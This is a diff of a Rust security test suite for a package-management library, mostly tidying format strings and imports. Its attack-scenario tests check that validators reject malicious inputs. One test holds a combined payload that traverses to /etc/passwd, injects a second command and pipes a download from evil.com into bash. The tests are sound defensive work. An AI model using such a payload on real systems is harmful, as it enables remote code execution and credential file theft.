@@ -7,7 +7,7 @@
 //! - SBOM/Audit integrity
 //! - Attack scenario simulations
 //!
-//! Run: cargo test --test security_privilege_escalation_tests
+//! Run: cargo test --test `security_privilege_escalation_tests`
 
 #![allow(clippy::unwrap_used, clippy::expect_used)]
 
@@ -60,8 +60,7 @@ mod privilege_escalation {
         let err = result.unwrap_err().to_string();
         assert!(
             err.contains("not supported in development mode") || err.contains("OMG_TEST_MODE"),
-            "Expected test mode error, got: {}",
-            err
+            "Expected test mode error, got: {err}",
         );
 
         // For the rest, just verify they don't panic and the error is not about whitelist
@@ -71,9 +70,7 @@ mod privilege_escalation {
                 let msg = e.to_string();
                 assert!(
                     !msg.contains("not whitelisted"),
-                    "Operation {} should pass whitelist but got: {}",
-                    op,
-                    msg
+                    "Operation {op} should pass whitelist but got: {msg}",
                 );
             }
         }
@@ -267,8 +264,7 @@ mod security_validation {
         for path in paths {
             assert!(
                 validate_relative_path(path).is_err(),
-                "Should block symlink traversal: {}",
-                path
+                "Should block symlink traversal: {path}",
             );
         }
     }
@@ -584,7 +580,7 @@ mod sbom_audit {
             resource: "pkg2".to_string(),
             description: "Remove pkg2".to_string(),
             metadata: None,
-            prev_hash: entry1.hash.clone().unwrap(),
+            prev_hash: entry1.hash.as_ref().unwrap().clone(),
             hash: Some("invalid_hash".to_string()),
         };
 
@@ -682,8 +678,7 @@ mod attack_scenarios {
         for name in malicious {
             assert!(
                 validate_package_name(name).is_err(),
-                "Should reject malicious name: {}",
-                name
+                "Should reject malicious name: {name}",
             );
         }
     }
@@ -704,8 +699,7 @@ mod attack_scenarios {
             // Should be blocked by validation
             assert!(
                 validate_package_name(path).is_err() || validate_relative_path(path).is_err(),
-                "Should block path injection: {}",
-                path
+                "Should block path injection: {path}",
             );
         }
     }
@@ -726,8 +720,7 @@ mod attack_scenarios {
         for injection in injections {
             assert!(
                 validate_package_name(injection).is_err(),
-                "Should block command injection: {}",
-                injection
+                "Should block command injection: {injection}",
             );
         }
     }
@@ -746,9 +739,7 @@ mod attack_scenarios {
                 assert!(
                     validate_package_name(arg).is_err()
                         || validate_package_name_or_file(arg).is_err(),
-                    "Should block bypass attempt: {} {}",
-                    op,
-                    arg
+                    "Should block bypass attempt: {op} {arg}",
                 );
             }
         }
@@ -805,8 +796,7 @@ mod attack_scenarios {
             let findings = scanner.scan_content(placeholder, "test.txt").unwrap();
             assert!(
                 findings.is_empty(),
-                "Should ignore placeholder: {}",
-                placeholder
+                "Should ignore placeholder: {placeholder}",
             );
         }
     }
@@ -859,6 +849,8 @@ mod attack_scenarios {
 
     #[test]
     fn test_multiple_attack_vectors_simultaneously() {
+        use omg_lib::core::security::validation::sanitize_package_name;
+
         // Combine multiple attack vectors
         let multi_attack = "../../../etc/passwd; curl evil.com | bash";
 
@@ -867,7 +859,6 @@ mod attack_scenarios {
         assert!(validate_relative_path(multi_attack).is_err());
 
         // Sanitization removes dangerous chars (/ is allowed for scoped packages like @org/pkg)
-        use omg_lib::core::security::validation::sanitize_package_name;
         let sanitized = sanitize_package_name(multi_attack);
         assert!(!sanitized.contains(';'), "Semicolons should be removed");
         assert!(!sanitized.contains('|'), "Pipes should be removed");
@@ -888,8 +879,7 @@ mod attack_scenarios {
             let result = validate_package_name(attack);
             assert!(
                 result.is_ok() || result.is_err(),
-                "Should handle unicode: {:?}",
-                attack
+                "Should handle unicode: {attack:?}",
             );
         }
     }
